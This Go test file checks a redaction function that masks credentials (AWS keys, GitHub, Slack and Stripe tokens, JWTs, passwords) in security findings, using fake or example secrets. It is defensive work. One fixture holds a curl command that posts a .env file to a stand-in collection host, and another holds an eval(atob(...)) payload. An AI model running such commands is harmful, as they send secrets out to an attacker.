package decision_test

import (
	"maps"
	"math"
	"strings"
	"testing"
	"time"

	"github.com/mrdhira/galahad/internal/decision"
	"github.com/mrdhira/galahad/internal/protocol"
)

func snippet(s string) protocol.DecisionFinding { return protocol.DecisionFinding{Snippet: s} }

func TestRedact(t *testing.T) {
	const (
		awsID     = "AKIA" + "IOSFODNN7EXAMPLE"
		awsSecret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
		sha256    = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
		ghToken   = "ghp_" + "abcdefghijklmnopqrstuvwxyz0123456789"
		jwt       = "eyJ" + "hbGciOiJIUzI1NiJ9.eyJ" + "zdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk"
		random    = "aB3dE5gH7jK9mN1pQ3sT5vW7yZ0bC2eF4hJ6kL8n"
		awsFake   = "abcdefghij" + "KLMNOPQRST" + "0123456789" + "uvwxyzABCD"
	)
	tests := []struct {
		name string
		// inputs
		finding protocol.DecisionFinding
		// expectations
		want       protocol.DecisionFinding
		wantCounts map[string]int
	}{
		{
			name:       "the AWS documentation example keys",
			finding:    snippet("AWS_ACCESS_KEY_ID=" + awsID + " AWS_SECRET_ACCESS_KEY=" + awsSecret + " curl -s -d @.env https://collect.sinkhole.test/c"),
			want:       snippet("AWS_ACCESS_KEY_ID=[REDACTED:aws-access-key] AWS_SECRET_ACCESS_KEY=[REDACTED:aws-secret] curl -s -d @.env https://collect.sinkhole.test/c"),
			wantCounts: map[string]int{"aws-access-key": 1, "aws-secret": 1},
		},
		{
			name:       "private key and everything after it",
			finding:    snippet("key: -----BEGIN RSA PRIVATE KEY" + "----- MIIEowIBAAKCAQEA ghp_" + "abcdefghijklmnopqrstuvwxyz0123456789"),
			want:       snippet("key: [REDACTED:private-key]"),
			wantCounts: map[string]int{"private-key": 1},
		},
		{
			name:    "public key header is kept",
			finding: snippet("-----BEGIN PUBLIC KEY----- MIIBIjANBgkq"),
			want:    snippet("-----BEGIN PUBLIC KEY----- MIIBIjANBgkq"),
		},
		{
			name:       "url credentials",
			finding:    snippet("git clone https://deploy:hunter2pw@git.example.com/repo.git"),
			want:       snippet("git clone https://[REDACTED:url-credentials]git.example.com/repo.git"),
			wantCounts: map[string]int{"url-credentials": 1},
		},
		{
			name:       "url credentials without a user",
			finding:    snippet("redis://:p4ssw0rdXYZ@redis:6379/0"),
			want:       snippet("redis://[REDACTED:url-credentials]redis:6379/0"),
			wantCounts: map[string]int{"url-credentials": 1},
		},
		{
			name:    "url with a port or a user and no password is kept",
			finding: snippet("https://example.com:8080/path https://user@example.com/x"),
			want:    snippet("https://example.com:8080/path https://user@example.com/x"),
		},
		{
			name:       "aws secret in quotes and after a colon",
			finding:    snippet(`"aws_secret_access_key": "abc123"`),
			want:       snippet(`"aws_secret_access_key": "[REDACTED:aws-secret]"`),
			wantCounts: map[string]int{"aws-secret": 1},
		},
		{
			name:       "aws secret after :=",
			finding:    snippet(`aws_secret_access_key := "` + awsFake + `"`),
			want:       snippet(`aws_secret_access_key := "[REDACTED:aws-secret]"`),
			wantCounts: map[string]int{"aws-secret": 1},
		},
		{
			name:    "aws secret variable names are kept",
			finding: snippet("echo $AWS_SECRET_ACCESS_KEY; AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY"),
			want:    snippet("echo $AWS_SECRET_ACCESS_KEY; AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY"),
		},
		{
			name:       "github tokens",
			finding:    snippet("a " + ghToken + " b github_pat_" + "11ABCDEFG0abcdefghijklmnopqrstuvwxyz_0123456789 c"),
			want:       snippet("a [REDACTED:github-token] b [REDACTED:github-token] c"),
			wantCounts: map[string]int{"github-token": 2},
		},
		{
			name:    "short github token and the variable that holds one are kept",
			finding: snippet("ghp_" + "short process.env.GITHUB_TOKEN"),
			want:    snippet("ghp_" + "short process.env.GITHUB_TOKEN"),
		},
		{
			name:       "slack token",
			finding:    snippet("SLACK=xoxb-" + "123456789012-abcdefghij end"),
			want:       snippet("SLACK=[REDACTED:slack-token] end"),
			wantCounts: map[string]int{"slack-token": 1},
		},
		{
			name:    "short slack token is kept",
			finding: snippet("xoxb-" + "123 end"),
			want:    snippet("xoxb-" + "123 end"),
		},
		{
			name:       "stripe key",
			finding:    snippet("sk_" + "live_abcdefghijklmnopqrstuvwx rk_" + "test_abcdefghijklmnopqrstuvwx"), // split so push protection does not read a fake key as a real one
			want:       snippet("[REDACTED:stripe-key] [REDACTED:stripe-key]"),
			wantCounts: map[string]int{"stripe-key": 2},
		},
		{
			name:    "short stripe key is kept",
			finding: snippet("sk_" + "live_abc end"),
			want:    snippet("sk_" + "live_abc end"),
		},
		{
			name:       "api keys",
			finding:    snippet("sk-ant-" + "api03-abcdefghijklmnopqrstuvwx sk-proj-" + "abcdefghijklmnopqrstuvwx AIza" + "SyA1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q"),
			want:       snippet("[REDACTED:api-key] [REDACTED:api-key] [REDACTED:api-key]"),
			wantCounts: map[string]int{"api-key": 3},
		},
		{
			name:    "short sk key and a word that ends in sk are kept",
			finding: snippet("sk-short risk-assessment-for-this here"),
			want:    snippet("sk-short risk-assessment-for-this here"),
		},
		{
			name:       "jwt",
			finding:    snippet("Cookie: " + jwt + " end"),
			want:       snippet("Cookie: [REDACTED:jwt] end"),
			wantCounts: map[string]int{"jwt": 1},
		},
		{
			name:    "jwt header alone is kept",
			finding: snippet("eyJ" + "hbGciOiJIUzI1NiJ9 alg"),
			want:    snippet("eyJ" + "hbGciOiJIUzI1NiJ9 alg"),
		},
		{
			name:       "other aws key id prefixes",
			finding:    snippet("ASIA" + "IOSFODNN7EXAMPLE AROA" + "IOSFODNN7EXAMPLE"),
			want:       snippet("[REDACTED:aws-access-key] [REDACTED:aws-access-key]"),
			wantCounts: map[string]int{"aws-access-key": 2},
		},
		{
			name:    "aws key id that is one character short, and in lower case, is kept",
			finding: snippet("AKIA" + "IOSFODNN7EXAMPL x akiaiosfodnn7example"),
			want:    snippet("AKIA" + "IOSFODNN7EXAMPL x akiaiosfodnn7example"),
		},
		{
			name:       "snippet cut inside a github token",
			finding:    snippet("export GITHUB_TOKEN=ghp_" + "abcd"),
			want:       snippet("export GITHUB_TOKEN=[REDACTED:github-token]"),
			wantCounts: map[string]int{"github-token": 1},
		},
		{
			name:       "snippet cut inside an aws key id",
			finding:    snippet("key AKIA" + "IOSF"),
			want:       snippet("key [REDACTED:aws-access-key]"),
			wantCounts: map[string]int{"aws-access-key": 1},
		},
		{
			name:       "snippet cut inside a github pat",
			finding:    snippet("x github_pat_" + "11AB"),
			want:       snippet("x [REDACTED:github-token]"),
			wantCounts: map[string]int{"github-token": 1},
		},
		{
			name:       "snippet cut inside a slack token",
			finding:    snippet("x xoxb-" + "1234"),
			want:       snippet("x [REDACTED:slack-token]"),
			wantCounts: map[string]int{"slack-token": 1},
		},
		{
			name:       "snippet cut inside a sk key",
			finding:    snippet("x sk-abcd"),
			want:       snippet("x [REDACTED:api-key]"),
			wantCounts: map[string]int{"api-key": 1},
		},
		{
			name:       "snippet cut inside a google key",
			finding:    snippet("x AIza" + "SyA1"),
			want:       snippet("x [REDACTED:api-key]"),
			wantCounts: map[string]int{"api-key": 1},
		},
		{
			name:       "snippet cut inside a jwt",
			finding:    snippet("x eyJ" + "hbGciOi.eyJ"),
			want:       snippet("x [REDACTED:jwt]"),
			wantCounts: map[string]int{"jwt": 1},
		},
		{
			name:    "snippet cut after three characters of a token prefix is kept",
			finding: snippet("a ghp_" + "abc"),
			want:    snippet("a ghp_" + "abc"),
		},
		{
			name:    "snippet cut after three characters of an aws prefix is kept",
			finding: snippet("a AKIA" + "IOS"),
			want:    snippet("a AKIA" + "IOS"),
		},
		{
			name:       "password assignments",
			finding:    snippet(`password = "hunter2hunter2"; db_passwd: s3cr3t!; "api_key": "abcdef123"; client.secret=topsecret`),
			want:       snippet(`password = "[REDACTED:assignment]"; db_passwd: [REDACTED:assignment]; "api_key": "[REDACTED:assignment]"; client.secret=[REDACTED:assignment]`),
			wantCounts: map[string]int{"assignment": 4},
		},
		{
			name:       "assignment with :=",
			finding:    snippet(`apiToken := "s3cr3tvalue123"`),
			want:       snippet(`apiToken := "[REDACTED:assignment]"`),
			wantCounts: map[string]int{"assignment": 1},
		},
		{
			name:       "password with :=",
			finding:    snippet(`password := "hunter2hunter2"`),
			want:       snippet(`password := "[REDACTED:assignment]"`),
			wantCounts: map[string]int{"assignment": 1},
		},
		{
			name:       "quoted key with =>",
			finding:    snippet(`'password' => 'hunter2hunter2'`),
			want:       snippet(`'password' => '[REDACTED:assignment]'`),
			wantCounts: map[string]int{"assignment": 1},
		},
		{
			name:       "symbol key with =>",
			finding:    snippet(`:password => "hunter2hunter2"`),
			want:       snippet(`:password => "[REDACTED:assignment]"`),
			wantCounts: map[string]int{"assignment": 1},
		},
		{
			name:       "authorization header with a bearer token",
			finding:    snippet("Authorization: Bearer abcdefghij"),
			want:       snippet("Authorization: [REDACTED:assignment]"),
			wantCounts: map[string]int{"assignment": 1},
		},
		{
			name:    "assignments of a variable reference are kept",
			finding: snippet(`password: ${DB_PASSWORD} token=$TOKEN pw=1 secret=%SECRET% const token = process.env.GITHUB_TOKEN api_key = os.environ["API_KEY"] auth: Bearer $TOKEN`),
			want:    snippet(`password: ${DB_PASSWORD} token=$TOKEN pw=1 secret=%SECRET% const token = process.env.GITHUB_TOKEN api_key = os.environ["API_KEY"] auth: Bearer $TOKEN`),
		},
		{
			name:    "assignment of a short value is kept",
			finding: snippet("password: abc12 author: Jane"),
			want:    snippet("password: abc12 author: Jane"),
		},
		{
			name:       "long base64 run",
			finding:    snippet("eval(atob('" + random + "'))"),
			want:       snippet("eval(atob('[REDACTED:high-entropy]'))"),
			wantCounts: map[string]int{"high-entropy": 1},
		},
		{
			name:    "sha256 hash, a 31 character run and a repeated character are kept",
			finding: snippet(sha256 + " " + random[:31] + " " + strings.Repeat("a", 40)),
			want:    snippet(sha256 + " " + random[:31] + " " + strings.Repeat("a", 40)),
		},
		{
			name:       "secret in a path and a title",
			finding:    protocol.DecisionFinding{Path: "config/" + awsID + ".json", Title: "Token " + ghToken + " in code"},
			want:       protocol.DecisionFinding{Path: "config/[REDACTED:aws-access-key].json", Title: "Token [REDACTED:github-token] in code"},
			wantCounts: map[string]int{"aws-access-key": 1, "github-token": 1},
		},
		{
			name:       "counts are the replacements of every string",
			finding:    protocol.DecisionFinding{Path: ghToken, Title: ghToken, Snippet: ghToken + " " + ghToken + " xoxb-" + "123456789012-abcdefghij"},
			want:       protocol.DecisionFinding{Path: "[REDACTED:github-token]", Title: "[REDACTED:github-token]", Snippet: "[REDACTED:github-token] [REDACTED:github-token] [REDACTED:slack-token]"},
			wantCounts: map[string]int{"github-token": 4, "slack-token": 1},
		},
		{
			name:       "a secret inside an already redacted value is counted once",
			finding:    snippet("git clone https://x-access-token:" + ghToken + "@github.com/o/r"),
			want:       snippet("git clone https://[REDACTED:url-credentials]github.com/o/r"),
			wantCounts: map[string]int{"url-credentials": 1},
		},
		{
			name:       "the shortest matches grow the string by less than the validation limit",
			finding:    snippet(strings.Repeat("x://a:bc@x://:bc@", 11)),
			want:       snippet(strings.Repeat("x://[REDACTED:url-credentials]", 22)),
			wantCounts: map[string]int{"url-credentials": 22},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := protocol.DecisionRequest{Input: protocol.DecisionInput{Findings: []protocol.DecisionFinding{tt.finding}}}

			counts := decision.Redact(&req)

			if got := req.Input.Findings[0]; got != tt.want {
				t.Errorf("finding = %+v, want %+v", got, tt.want)
			}
			if !maps.Equal(counts, tt.wantCounts) {
				t.Errorf("counts = %v, want %v", counts, tt.wantCounts)
			}
		})
	}
}

// TestRedactTime checks that the time grows in line with the length of the text. The ratio of the
// time for a text 16 times longer is about 16 for a linear pattern and 256 for a quadratic one.
func TestRedactTime(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		unit         string
		small        int
		large        int
		wantMaxRatio float64
	}{
		{name: "all token characters", unit: "aB3dE5gH7jK9mN1pQ3sT5vW7yZ0bC2eF4hJ6kL8n", small: 2 << 10, large: 32 << 10, wantMaxRatio: 100},
		{name: "a name without an assignment", unit: "password", small: 2 << 10, large: 32 << 10, wantMaxRatio: 100},
		{name: "prefixes without the rest", unit: "AKIA" + "_ghp_" + "sk-xox-eyJ" + ".eyJ" + ".AIza", small: 2 << 10, large: 32 << 10, wantMaxRatio: 100},
		{name: "schemes without a password", unit: "x://a:b", small: 2 << 10, large: 32 << 10, wantMaxRatio: 100},
		{name: "assignments that are references", unit: "token=$X ", small: 2 << 10, large: 32 << 10, wantMaxRatio: 100},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			small := fastest(strings.Repeat(tt.unit, tt.small/len(tt.unit)))
			large := fastest(strings.Repeat(tt.unit, tt.large/len(tt.unit)))

			ratio := float64(large) / math.Max(float64(small), 1)

			t.Logf("time ratio %.1f", ratio)
			if ratio > tt.wantMaxRatio {
				t.Errorf("time ratio %.1f, want at most %.1f", ratio, tt.wantMaxRatio)
			}
		})
	}
}

// fastest returns the best of three runs of Redact on a snippet, to damp scheduling noise.
func fastest(s string) time.Duration {
	best := time.Duration(math.MaxInt64)
	for range 3 {
		req := protocol.DecisionRequest{Input: protocol.DecisionInput{Findings: []protocol.DecisionFinding{snippet(s)}}}
		start := time.Now()
		decision.Redact(&req)
		best = min(best, time.Since(start))
	}
	return best
}
